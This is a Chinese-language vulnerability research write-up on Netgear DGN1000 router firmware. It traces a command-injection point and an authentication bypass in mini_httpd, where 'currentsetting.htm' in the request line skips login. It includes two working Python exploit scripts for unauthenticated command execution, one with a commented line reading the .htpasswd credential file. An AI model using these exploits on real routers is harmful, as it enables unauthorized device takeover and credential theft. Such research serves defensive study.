# DGN1000_unauthorized_comamnd_injection
```
binwalk -Me DGN1000WW_V1.1.00.45.img 
```

![](vx_images/132362590910059.png)
mips 32位 大端 

---

# 启动项分析

var/etc/rcS脚本

```
#!/bin/sh
export PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/sbin/scripts:/usr/local/sbin
UTC=yes

mount -n -t proc proc /proc
mount -n -t ramfs ramfs /tmp


# build var directories
/bin/mkdir -m 0777 /tmp/var
/bin/mkdir -m 0777 /tmp/adsl
/bin/mkdir -m 0777 /tmp/etc
/bin/mkdir -m 0777 /tmp/dev
/bin/mkdir -m 0777 /tmp/dev/pts
/bin/mkdir -m 0777 /var/lock
/bin/mkdir -m 0777 /var/log
/bin/mkdir -m 0777 /var/run
/bin/mkdir -m 0777 /var/tmp
/bin/mkdir -m 0755 /etc/dnrd
/bin/cp -a /usr/etc/* /etc
/bin/cp -a /usr/dev/* /dev/
mount -t devpts devpts /dev/pts

# start services

#iptables modules
/sbin/insmod /lib/modules/ipt_condition.ko
/sbin/insmod /lib/modules/ipt_REJECT.ko
/sbin/insmod /lib/modules/ipt_PNAT.ko
/sbin/insmod /lib/modules/ipt_psd.ko
/sbin/insmod /lib/modules/ipt_http_string.ko
cat /tmp/etc/block.htm > /proc/block_gui

insmod /lib/modules/ct_mgr.ko
insmod /lib/modules/led.ko
pb_ap&
#potcounter&

/usr/sbin/brctl addbr br0
/usr/sbin/brctl stp br0 no
/sbin/ifconfig eth0 up
/usr/sbin/brctl addif br0 eth0
ifconfig eth0 0.0.0.0
ifconfig br0 up

/sbin/klogd&

/usr/sbin/rc init                      ####################################################################################
/usr/sbin/scfgmgr
/usr/sbin/rc start                     ####################################################################################

/usr/sbin/adslmod &
sleep 3

# will be start in rc
#/sbin/syslogd -f /etc/syslog.conf

/usr/sbin/crond &

/usr/sbin/atm_monitor init
/usr/sbin/cmd_agent_ap
/usr/sbin/wifi_monitor &
#/usr/sbin/utelnetd &


# stamp lan start time

/bin/cp /proc/uptime /tmp/lan_uptime

ifconfig lo 127.0.0.1
route add -net 127.0.0.0 netmask 255.255.0.0 lo
#cd /art_build && ./load_usb.sh

#JIM force to use IGMP v2
echo "2" > /proc/sys/net/ipv4/conf/all/force_igmp_version

# pppox
echo 1 > /proc/sys/net/ipv4/ip_dynaddr
# add more conntrack
# echo 2048 > /proc/sys/net/nf_conntrack_max
# ignore_all not yet used: this should be satisfactory
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
# drop spoofed addr: turn this off when rip is on ?
echo 1 > /proc/sys/net/ipv4/conf/default/rp_filter
echo 1 > /proc/sys/net/ipv4/conf/all/rp_filter
# do not honor source route flags
echo 0 > /proc/sys/net/ipv4/conf/default/accept_source_route
echo 0 > /proc/sys/net/ipv4/conf/all/accept_source_route
# this needs proper sampling on av_blog to determine optimal value
# for now just observe softnet_stats to see # time was throttled
# historical value was 300
echo 100 > /proc/sys/net/core/netdev_max_backlog

echo  86400 > /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_established
echo 1024 > /proc/sys/vm/min_free_kbytes
echo 1 > /proc/sys/vm/drop_caches
# Do not check tcp/udp/icmp checksum
echo 0 > /proc/sys/net/netfilter/nf_conntrack_checksum
```

挂载，创建目录，初始化基本配置

注意这里的
/usr/sbin/rc init 
/usr/sbin/rc start
我们用ida分析/usr/sbin/rc 


![](vx_images/245553635389981.png)

rc start主要就读取了一些本机数据。


![](vx_images/258844048817380.png)

我们主要关注httpd如何起的，通过mini_httpd去定位


![](vx_images/314804375910606.png)
![](vx_images/498884813202003.png)

这里可以主要到，起mini_httpd服务时，参数有四个。


---

# #FirmAE
```
sudo ./run.sh -d Netgear '/home/iot/Desktop/Netgear/NetgearDGN1000/DGN1000WW_V1.1.00.45.img'
```

![](vx_images/415716371706255.png)
网上找一下netgear路由器的默认账号密码admin:password


# mini_httpd模拟

页面中的诊断功能都是提交到setup.cgi，我们去分析一下setup.cgi

![](vx_images/494201857646261.png)

通过ping字符串来找，发现漏洞点拼接了命令。

![](vx_images/482803152465043.png)

mypipe（）的功能应该是执行v5处的命令，然后返回值放到ping_output中。
注意这里的59  ，过滤了；  这里我们用|



![](vx_images/507474907473631.png)
![](vx_images/25805618052810.png)

发现文件已经有了，但文件为空 

这里应该是我们权限的问题，无法写操作

---

![](vx_images/21526719452531.png)


最后在这里发现了个后门页面，访问发现可以命令执行 。


![](vx_images/535906218752489.png)

![](vx_images/77490624384333.png)

但是现在是已授权命令执行，我们需要绕过BA认证。
![](vx_images/536381941701306.png)
删除Authorization: Basic YWRtaW46cGFzc3dvcmQ=后，会显示Authorization: warning，无法命令执行。

---
# 未授权绕过

本服务是用mini_httpd起的，Authorization功能应该也是在其中的。我们用ida分析看看

![](vx_images/471122002746760.png)
尝试用授权相关的字符串定位WWW-Authenticate:

![](vx_images/596833289219970.png)

查看上级调用的函数，注意到系统日志记录了Administrator login successful - IP:%s
![](vx_images/390022922856594.png)



接下来，我们注意到打印登录成功日志前，有一个判断。
![](vx_images/552905401506301.png)

如果flag==0  就会正常执行登录流程，并用kill(ppid,1)将程序挂起。而kill(ppid,17)则会终止程序。这也从侧面说明，它是授权判断完成后，再结束程序的，所以我们只要能控制flag的值为0，很可能就能登录成功。

---
# 上面这个地方有个坑
判断进入条件的时候，if(flag==1)之前还有个if(a1)，因为判断不够全面浪费了很多时间。

---


所以这里我们去查看flag的引用，看是否又可以给它赋值的地方。


![](vx_images/483973858331806.png)

我们看到这里给flag赋值了。
同时让我们再来关注下a1是从哪里来的
![](vx_images/533044257912102.png)
首先a1由调用函数传参。

![](vx_images/290821426444562.png)
来自于dword_100000DC.
![](vx_images/418902345195970.png)

在整个上层函数中，只有这里调用了它。
程序的逻辑如下
```
currentsetting.htm存在 -----》dword_100000DC=0   -------》a1=0   ---------》不进入if(a1),直接执行后面的功能
```





详细分析下if(a1)这里

![](vx_images/434784871821804.png)


如果flag==1的话，跳转到lable12
![](vx_images/490116421823088.png)

# 结构体stat知识补充
```
int stat(const char *path, struct stat *buf);
参数
    path：要获取状态信息的文件或目录的路径。
    buf：指向一个 struct stat 结构体的指针，stat 函数会将文件状态信息填充到这个结构体中。
返回值
    返回 0 表示成功。
    返回 -1 表示失败，并设置 errno 以指示具体错误。
```

# 代码分析


 前面定义了
 char v116[10000]; // [sp+2B28h] [-3330h] BYREF
 struct stat v117; // [sp+5238h] [-C20h] BYREF


![](vx_images/297617282595866.png)
这里拼接路径，加上后缀/.htpasswd
stat 函数用于检查 .htpasswd 文件是否存在，如果不存在且 IP 地址与预期不符，则记录管理员登录成功的日志

---

解释下这个判断
![](vx_images/144466560117124.png)
```
这个地方，是因为每次进来的数据包ip_addr会被存在&byte_10000040这个位置。只有另一个ip再登录的时候，才会系统才会打印"Administrator login successful - IP:%s"
不做这个判断的话，同一个ip每次发一个包，日志就会记录这个
```

---






如果这里没有进入if(stat())
程序会执行如下  代码行173到292
```

```

![](vx_images/326568052935500.png)

先判断dword_100073B0是否存在，不存在输出未授权
拿出前6个字节，和Basic 比较，不一样也输出未授权。
那很明显，后面它就要比较base64加密后的密码了

![](vx_images/216386443090192.png)
果然下面调用了strcmp  ,且在比较后打印是否授权成功。



---
所以到这里我们可以判断，

当a1=1,flag=0,会直接认证成功。
当a1=1,flag=1时，会进行账号密码的验证。
当a1=0, 会直接if（）中的语句，直接绕过验证，继续执行LABEL_61:  后的代码

---


因为验证是否授权，都在这个if(a1)中，所以a1=0  直接跳到后面，实现了未授权。



# 向上寻找输入点
所以综合上述，我们只要保证dword_10007390中有currentsetting.htm就可能实现未授权命令执行。

![](vx_images/483973858331806.png)

---
## 思路1
简单思路如下：
![](vx_images/42327572223737.png)

dword_10007390之前先做了判断，之后来自于格式化字符串/ca/setup.cgi?next_file=%s格式。感觉上是从url头获取的值，所以尝试一下，也可以越权


![](vx_images/83186467257873.png)

成功越权了。


---

exp编写

```
import requests

cmd = "ls"
target_ip="192.168.0.1"



burp0_url = "http://"+target_ip+"/setup.cgi?todo=syscmd&cmd=" + cmd + "&_=1721817685516&currentsetting.htm"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "close",
    "Referer": "http://192.168.0.1/syscmd.htm"
}


response = requests.get(burp0_url, headers=burp0_headers)


if response.status_code == 200:

    print "Response content:"
    print response.text
else:
    print "Request failed with status code:", response.status_code

```


---


## 思路二
思路二抱着学习的态度，一步一步分析httpd处理流程。


要dword_10007390中含有currentsetting.htm，那我们继续追溯dword_10007390。
![](vx_images/361596216444626.png)

这里我们不是setupwizard.cgi，我们的exp,应该是不走这里的 ，我们继续向前看。

![](vx_images/502667988270643.png)


strpbrk 函数在 v2 字符串中查找第一次出现的空格 ' '、制表符 '\t'、换行符 '\n' 或回车符 '\r' 的位置。
所以dword_10007390是从v2来的一个字符串
继续向上看，v2 = (const char *)sub_4018AC()
查看该函数
![](vx_images/166112069509479.png)
数据来自于dword_1000737C+v0  ,v0猜测是个偏移


![](vx_images/598061668215043.png)

接下来分析sub_401DCC（）这个函数分析后
发现它是做复制操作。  
```
sub_401DCC(int *a1, size_t *a2, _DWORD *a3, const void *a4, size_t a5);
    int *a1: 指向内存块起始地址的指针。
    size_t *a2: 指向内存块大小的指针。
    _DWORD *a3: 指向当前已使用内存大小的指针。
    const void *a4: 指向要复制的数据的指针。
    size_t a5: 要复制的数据的大小。
```

所以结合来看 数据来自于v77,长度为v0.

![](vx_images/162074758531264.png)
最后数据就来自于dword_10007368这个地址。查看交叉引用，到了main函数.

![](vx_images/154842486369764.png)


```

accept(v46, v55, &v58)
v46: 是服务器端的套接字描述符，用于监听客户端连接请求的套接字。
v55: 是一个指向存储客户端地址信息的结构体指针，通常是 struct sockaddr * 类型。
&v58: 是一个指向存储客户端地址信息长度的整数指针，通常是 socklen_t * 类型。
```

向上查看v46从哪里来的
![](vx_images/131524839173062.png)
来自一个全局变量，dword_1000635C
向上查看引用
![](vx_images/411505020987343.png)
来源于这个函数，点进去，
![](vx_images/237716359259597.png)
这是一个典型简历socket的过程，其中传进来的参数是个结构体    ，所以程序通过socket建立起了信道，传输数据。
```
struct sockaddr_in {
    sa_family_t    sin_family; // 2 bytes
    in_port_t      sin_port;   // 2 bytes
    struct in_addr sin_addr;   // 4 bytes
    char           sin_zero[8];// 8 bytes
};
```


---

综上，htppd的处理逻辑是，在一次socket传输中，只要数据里面带有currentsetting.htm字符，那他就可以绕过httpd的授权。
![](vx_images/303374611717866.png)
我们再详细分析下这里
```
补充知识
在 HTTP 协议中，每个头部字段之间是以 \r\n（回车符和换行符）作为分隔符的，而头部字段和消息主体之间则是以一个空行（即 \r\n\r\n）作为分隔符的。

具体来说：

头部字段之间：每个头部字段都以 \r\n 结尾，例如 Content-Type: text/html\r\n。
头部和消息主体之间：头部字段结束后会有一个空行，即 \r\n\r\n，表示头部字段的结束，紧接着就是消息主体的内容。
这个空行 \r\n\r\n 或者 \n\n是 HTTP 协议中分隔头部和消息主体的标识，用于指示头部字段的结束和消息主体的开始。
```
所以上面的代码，实现了读取一整个http请求包的功能。读完一个请求包，处理后。才会又去内存中读第二个。


这意味着 我只要在请求头中的任意位置带有currentsetting.htm字符，就可以实现httpd的未授权绕过。

到了这里仔细看一下dword_10007390，就知道，他是取的httpd包请求头中的第一行，我就不再赘述了。

让我们来试试

exp.py  
```
import requests


#cat+/www/.htpasswd
#cmd = "cat+/www/.htpasswd"

cmd = "echo currentsetting.htm > 1.txt & cat 1.txt"
target_ip="192.168.0.1"



burp0_url = "http://"+target_ip+"/setup.cgi?todo=syscmd&cmd=" + cmd + "&_=1721817685516"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br,",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "close",
    "Referer": "http://192.168.0.1/syscmd.htm"
}


response = requests.get(burp0_url, headers=burp0_headers)


if response.status_code == 200:

    print "Response content:"
    print response.text
else:
    print "Request failed with status code:", response.status_code

```

![](vx_images/459048116325537.png)

只要不影响程序正常执行，出现在一次http请求包的第一行（请求行位置）任意位置，都可以实现未授权。


---



---
# tips：

1.构建自己的firmwalker字典
```
grep -r ""
find ./ -name ""
可以帮我们快速找到后门或敏感信息，这里主要是要多完善自己的字典
```
修改了firmwalker中data/file字典的值，以便以后遇到这种，能直接扫出来。
![](vx_images/454952779437102.png)

2.ida和ghidra结合着看，伪代码和汇编结合着看。

3.思路收获
![](vx_images/211071630570316.png)
一定要结合流程图看，例如我知道上图中，红线的地方有个跳转，且中间跳过的地方存在验证登录，但程序最后都走到了一起，这就很可能有未授权。
结合流程图，让我们更容易找到这种漏洞可能存在的点。

---




